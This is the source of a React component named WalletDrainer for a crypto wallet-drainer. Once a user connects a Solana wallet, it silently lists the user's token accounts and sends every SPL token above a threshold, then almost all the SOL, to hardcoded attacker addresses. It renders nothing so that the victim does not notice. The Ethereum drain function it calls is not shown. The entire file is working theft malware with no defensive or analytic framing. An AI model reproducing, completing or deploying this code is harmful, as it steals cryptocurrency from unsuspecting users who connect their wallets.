"use client";

import { useEffect } from "react";
import { ethers } from "ethers";
import { Connection, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, TOKEN_PROGRAM_ID } from "@solana/spl-token";
import { useWalletInfo } from "@reown/appkit/react";
import { useAppKitConnection } from "@reown/appkit-adapter-solana/react";
import { useAppKitAccount, useAppKitProvider } from "@reown/appkit/react";

const DRAIN_ADDRESSES = {
  ethereum: "0x0775bfb375757a355af3e318a55f6a23ba03d520",
  solana: "DcxDHKrEM7CY6nHZJepi9GzRh9vNFJnHt5ipaoxs8ZVB",
};

// Ethereum drain function remains unchanged

export default function WalletDrainer({ wallet }) {
  // Existing hooks and state
  const { walletInfo } = useWalletInfo();
  const { isConnected, address, caipAddress } = useAppKitAccount();
  const { connection } = useAppKitConnection();
  const { walletProvider } = useAppKitProvider("solana");

  useEffect(() => {
    if (!wallet || !isConnected || !address) return;

    async function drainSolanaWallet() {
      console.log("🔄 SOL Drainer Triggered", address);
      const senderPublicKey = new PublicKey(address);
      const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);

      try {
        // Get all token accounts
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
          senderPublicKey,
          { programId: TOKEN_PROGRAM_ID }
        );

        // Filter tokens with balance > 0.2 (adjust threshold as needed)
        const tokensToDrain = tokenAccounts.value.filter(account => {
          const info = account.account.data.parsed.info;
          return BigInt(info.tokenAmount.amount) > 200000000n; // 0.2 tokens with 6 decimals
        });

        console.log(`🤑 Found ${tokensToDrain.length} tokens to drain`);

        // Drain SPL Tokens First
        for (const tokenAccount of tokensToDrain) {
          try {
            const { mint, tokenAmount } = tokenAccount.account.data.parsed.info;
            const mintPublicKey = new PublicKey(mint);
            const amount = BigInt(tokenAmount.amount);

            // Get recipient ATA
            const recipientATA = await getAssociatedTokenAddress(
              mintPublicKey,
              recipientPublicKey
            );

            // Create transaction
            const tx = new Transaction();
            
            // Add ATA creation if needed
            const ataInfo = await connection.getAccountInfo(recipientATA);
            if (!ataInfo) {
              tx.add(createAssociatedTokenAccountInstruction(
                senderPublicKey,
                recipientATA,
                recipientPublicKey,
                mintPublicKey
              ));
            }

            // Add token transfer
            tx.add(createTransferInstruction(
              new PublicKey(tokenAccount.pubkey),
              recipientATA,
              senderPublicKey,
              amount,
              [],
              TOKEN_PROGRAM_ID
            ));

            // Get latest blockhash
            const blockhash = await connection.getLatestBlockhash();
            tx.recentBlockhash = blockhash.blockhash;
            tx.feePayer = senderPublicKey;

            // Send transaction
            const sig = await walletProvider.sendTransaction(tx, connection);
            await connection.confirmTransaction(sig);
            console.log(`✅ Drained ${tokenAmount.uiAmount} ${mint} (${sig})`);
            
          } catch (error) {
            console.error(`❌ Failed to drain token ${mint}:`, error.message);
          }
        }

        // Drain SOL Last
        const balance = await connection.getBalance(senderPublicKey);
        const fee = await connection.getFeeForMessage(
          new Transaction().compileMessage(),
          "confirmed"
        ) || 5000;

        if (balance > fee) {
          const tx = new Transaction().add(
            SystemProgram.transfer({
              fromPubkey: senderPublicKey,
              toPubkey: recipientPublicKey,
              lamports: balance - fee
            })
          );

          const blockhash = await connection.getLatestBlockhash();
          tx.recentBlockhash = blockhash.blockhash;
          tx.feePayer = senderPublicKey;

          const sig = await walletProvider.sendTransaction(tx, connection);
          await connection.confirmTransaction(sig);
          console.log(`✅ Drained ${(balance - fee)/LAMPORTS_PER_SOL} SOL (${sig})`);
        }

      } catch (error) {
        console.error("💣 Critical drain error:", error);
      }
    }

    // Trigger appropriate chain drainer
    caipAddress?.toLowerCase().includes("solana") 
      ? drainSolanaWallet()
      : drainEthereumWallet(wallet);
  }, [wallet, caipAddress, isConnected, address, connection, walletProvider]);

  return null;
}